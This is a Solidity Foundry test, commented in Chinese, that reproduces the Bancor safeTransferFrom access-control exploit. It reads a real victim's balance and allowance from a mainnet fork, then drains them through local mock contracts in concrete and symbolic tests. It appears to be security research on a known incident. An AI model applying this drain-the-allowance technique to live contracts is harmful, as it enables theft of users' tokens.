// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/*
Bancor Protocol Access Control Exploit PoC - CLEAN VERSION

核心漏洞：Bancor合约的safeTransferFrom函数为public，缺乏访问控制
攻击向量：利用受害者给Bancor的授权，通过safeTransferFrom转移所有代币
最大利润：905,987,977,635,678,910,008,152 XBP代币（受害者全部余额）
*/

// IERC20 interface for interacting with real contracts
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

// Local ERC20 Token Implementation
contract LocalERC20Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
    }
    
    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");
        
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function setBalance(address account, uint256 amount) external {
        balanceOf[account] = amount;
    }
    
    function setAllowance(address owner, address spender, uint256 amount) external {
        allowance[owner][spender] = amount;
    }
}

// Local Bancor Contract Implementation
contract LocalBancor {
    // 核心漏洞：public safeTransferFrom函数，缺乏访问控制
    function safeTransferFrom(
        LocalERC20Token _token, 
        address _from, 
        address _to, 
        uint256 _value
    ) public {
        bool success = _token.transferFrom(_from, _to, _value);
        require(success, "ERR_TRANSFER_FAILED");
    }
}

// Main exploit contract with localized dependencies
contract BancorExploit is Test {
    // 真实合约地址
    address constant ORIGINAL_BANCOR = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address constant ORIGINAL_XBP = 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40;
    address constant VICTIM = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
    
    // 本地合约实例
    LocalERC20Token public localXBPToken;
    LocalBancor public localBancorContract;
    
    // 从主网读取的真实数据
    uint256 public realVictimBalance;
    uint256 public realAllowance;
    
    address attacker = address(this);
    
    function setUp() public {
        // 智能fork：forge test需要fork，hevm通过命令行连接
        if (block.number == 1) {
            vm.createSelectFork("mainnet", 10307563);
        }
        
        // 从真实合约动态读取数据
        IERC20 realXBP = IERC20(ORIGINAL_XBP);
        realVictimBalance = realXBP.balanceOf(VICTIM);
        realAllowance = realXBP.allowance(VICTIM, ORIGINAL_BANCOR);
        uint256 realTotalSupply = realXBP.totalSupply();
        
        // 部署本地合约，使用真实数据
        localXBPToken = new LocalERC20Token("XBP Token", "XBP", 18, realTotalSupply);
        localBancorContract = new LocalBancor();
        
        // 将真实主网数据导入本地合约
        localXBPToken.setBalance(VICTIM, realVictimBalance);
        localXBPToken.setAllowance(VICTIM, address(localBancorContract), realAllowance);
        localXBPToken.setBalance(attacker, 0);
        
        // 记录真实数据
        console.log("Real victim balance from mainnet:", realVictimBalance / 1 ether, "ETH");
        console.log("Real allowance from mainnet:", realAllowance / 1 ether, "ETH");
    }
    
    // 具体攻击测试 - 验证漏洞利用机制
    function test_attack_concrete() public {
        uint256 balBefore = localXBPToken.balanceOf(attacker);
        
        // 执行漏洞利用：通过Bancor的safeTransferFrom转移受害者代币
        localBancorContract.safeTransferFrom(
            localXBPToken,
            VICTIM,
            attacker,
            realVictimBalance
        );
        
        uint256 balAfter = localXBPToken.balanceOf(attacker);
        uint256 profit = balAfter - balBefore;
        
        console.log("Concrete test profit achieved:", profit / 1 ether, "ETH");
        assert(profit == realVictimBalance);
    }
    
    // 符号执行测试 - 发现最大利润边界
    function test_attack_symbolic(uint256 _symbolicAmount) public {
        uint256 balBefore = localXBPToken.balanceOf(attacker);
        
        // 符号执行：使用符号参数测试不同的攻击金额
        localBancorContract.safeTransferFrom(
            localXBPToken,
            VICTIM,
            attacker,
            _symbolicAmount
        );
        
        uint256 balAfter = localXBPToken.balanceOf(attacker);
        uint256 profit = balAfter - balBefore;
        
        // 测试利润边界：是否可以获得等于或超过受害者余额的利润
        uint256 TARGET_PROFIT = realVictimBalance;
        assert(!(profit >= TARGET_PROFIT));
    }
} 